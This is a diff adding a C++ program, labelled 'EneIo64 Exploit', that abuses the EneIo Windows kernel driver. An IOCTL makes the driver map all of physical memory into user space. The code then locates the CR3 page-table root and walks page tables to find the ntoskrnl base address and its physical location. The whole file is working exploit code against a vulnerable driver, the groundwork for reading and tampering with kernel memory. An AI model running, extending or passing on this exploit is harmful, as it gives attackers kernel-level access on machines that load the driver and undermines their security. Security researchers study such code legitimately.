@@ -1,0 +1,164 @@
+#include <windows.h>
+#include <winioctl.h>
+#include <iostream>
+#include <stdio.h>
+
+
+typedef struct _MAPPHYSTOVA {
+    ULONGLONG Size;
+    ULONGLONG Ignore2;
+    ULONGLONG Ignore3;
+    ULONGLONG MappingAddress;
+    ULONGLONG Ignore5;
+} MAPPHYSTOVA, * PMAPPHYSTOVA;
+
+typedef struct _PAGE_TABLE_INDICES {
+    DWORD pml4Index;
+    DWORD pdpIndex;
+    DWORD pdIndex;
+    DWORD ptIndex;
+    DWORD offset;
+} PAGE_TABLE_INDICES, * PPAGE_TABLE_INDICES;
+
+using std::cout;
+using std::endl;
+using std::hex;
+using std::dec;
+
+// Device path for CreateFile
+#define ENEIO_DEVICE_NAME "\\\\.\\EneIo"
+
+// IOCTL Definitions
+#define IOCTL_WINIO_MAPPHYSTOVA   0x80102040
+
+HANDLE GetHandleToDriver() {
+    HANDLE hDevice = CreateFileA(ENEIO_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    if (hDevice == INVALID_HANDLE_VALUE)
+    {
+        cout << "[!] Unable to get a handle to the driver: " << GetLastError() << endl;
+    }
+    else
+    {
+        cout << "[+] Driver handle: " << hDevice << endl;
+    }
+
+    return hDevice;
+}
+
+ULONGLONG MapMemory(HANDLE hDevice, ULONGLONG* SizeOfMapping) {
+    DWORD bytesReturned = 0;
+
+    MAPPHYSTOVA map = { 0 };
+
+    BOOL result = DeviceIoControl(hDevice, IOCTL_WINIO_MAPPHYSTOVA, &map, sizeof(map), &map, sizeof(map), &bytesReturned, NULL);
+
+    *SizeOfMapping = map.Size;
+    return map.MappingAddress;
+}
+
+void ExtractPageTableIndices(DWORD64 virtualAddress, PAGE_TABLE_INDICES* indices)
+{
+    indices->pml4Index = (virtualAddress >> 39) & 0x1FF;     // Bits 39-47
+    indices->pdpIndex = (virtualAddress >> 30) & 0x1FF;      // Bits 30-38
+    indices->pdIndex = (virtualAddress >> 21) & 0x1FF;       // Bits 21-29
+    indices->ptIndex = (virtualAddress >> 12) & 0x1FF;       // Bits 12-20
+    indices->offset = virtualAddress & 0xFFF;                // Bits 0-1
+}
+
+ULONGLONG GetPhysicalAddress(ULONGLONG PmlBase, ULONGLONG VirtualAddressToResolve, ULONGLONG UserModeAddress) {
+    PAGE_TABLE_INDICES indices;
+    ExtractPageTableIndices(VirtualAddressToResolve, &indices);
+
+    ULONGLONG pml4e = *((ULONGLONG*)(UserModeAddress + PmlBase + (8 * indices.pml4Index)));
+    ULONGLONG pdpt = pml4e & 0xFFFFFFFF000;
+
+    ULONGLONG pdpte = *((DWORD64*)(UserModeAddress + pdpt + (8 * indices.pdpIndex)));
+    ULONGLONG pdt = pdpte & 0xFFFFFFFF000;
+
+    ULONGLONG pde = *((DWORD64*)(UserModeAddress + pdt + (8 * indices.pdIndex)));
+
+    // is the 'large-page' flag set
+    if (pde & (1ULL << 7)) {
+        ULONGLONG pte = pde & 0xFFFFFFFF000;
+        pte += (indices.ptIndex << 12);
+        pte += indices.offset;
+        return pte;
+    }
+    else {
+        // todo: kernel seems to be mapped as large pages so don't care for now
+        return 0;
+    }
+}
+
+DWORD FindCR3Value(ULONGLONG VirtualAddressBase, DWORD* cr3Page) {
+    // the final stub reference is always between 0x10000 and 0x20000
+    for (DWORD page = 0x10000; page <= 0x20000; page += 0x1000) {
+        // CR3 value is at an offset of 0xA0
+        DWORD64 potential_cr3 = *((DWORD64*)((BYTE*)VirtualAddressBase + page + 0xA0));
+
+        if ((potential_cr3 & 0xFFF) == 0 &&
+            ((potential_cr3 >> 12) & 0xF) != 0 && ((potential_cr3 >> 16) & 0xF) != 0 && ((potential_cr3 >> 20) & 0xF) != 0 &&
+            (potential_cr3 >> 24) == 0) {
+
+            // halpLMStub reference is at an offset of 0x70
+            DWORD64 checkHalpLMStub = *((DWORD64*)(BYTE*)VirtualAddressBase + page + 0x70);
+            if ((checkHalpLMStub & 0xfffff80000000000) == 0xfffff80000000000) {
+                *cr3Page = page;
+                return ((DWORD)potential_cr3 & 0xFFFFFFFF);
+            }
+        }
+    }
+
+    return 0;
+}
+
+ULONGLONG GetNtBaseFromCR3Page(ULONGLONG VirtualAddressBase, DWORD cr3Page, DWORD cr3) {
+    // read the function address
+    DWORD64 halpLMStub = *((DWORD64*)(VirtualAddressBase + (ULONGLONG)cr3Page) + 0xe);
+
+    // try to find MZ
+    for (ULONGLONG i = 0x100000; i > 0x0; i--) {
+        ULONGLONG read = (halpLMStub & 0xfffffffffff00000) - (i * 0x1000);
+
+        ULONGLONG physAddr = GetPhysicalAddress(cr3, read, VirtualAddressBase);
+        ULONGLONG possibleBase = *((DWORD64*)(VirtualAddressBase + physAddr));
+
+        if ((possibleBase & 0xffff) == 0x5a4d) {
+            return read;
+        }
+    }
+
+    // failed
+    return 0x0;
+}
+
+int main() {
+    cout << endl << "EneIo64 Exploit" << endl << "---------------" << endl;
+
+    // get handle to driver
+    HANDLE hDevice = GetHandleToDriver();
+    if (hDevice == INVALID_HANDLE_VALUE) return 1;
+
+    // map the entire physical address range
+    ULONGLONG sizeOfMapping = 0;
+    ULONGLONG baseAddress = MapMemory(hDevice, &sizeOfMapping);
+    cout << "[+] Base Address of Mapping: 0x" << hex << baseAddress << endl;
+    cout << "[+] Size of Mapping: 0x" << hex << sizeOfMapping << endl;
+
+    // search for cr3
+    DWORD cr3Page = 0;
+    DWORD cr3 = FindCR3Value(baseAddress, &cr3Page);
+    cout << "[+] CR3 value: 0x" << hex << cr3 << endl;
+    cout << "[+] CR3 in Page: 0x" << hex << cr3Page << endl;
+
+    // get PML4T from physical page
+    ULONGLONG ntBase2 = GetNtBaseFromCR3Page(baseAddress, cr3Page, cr3);
+    cout << "[+] NTOSKRNL Base: 0x" << hex << ntBase2 << endl;
+
+    // get physical address of ntoskrnl
+    ULONGLONG ntPhysicalAddress = GetPhysicalAddress(cr3, ntBase2, baseAddress);
+    cout << "[+] NTOSKRNL Base Physical Address: 0x" << hex << ntPhysicalAddress << endl;
+
+    return 0;
+}
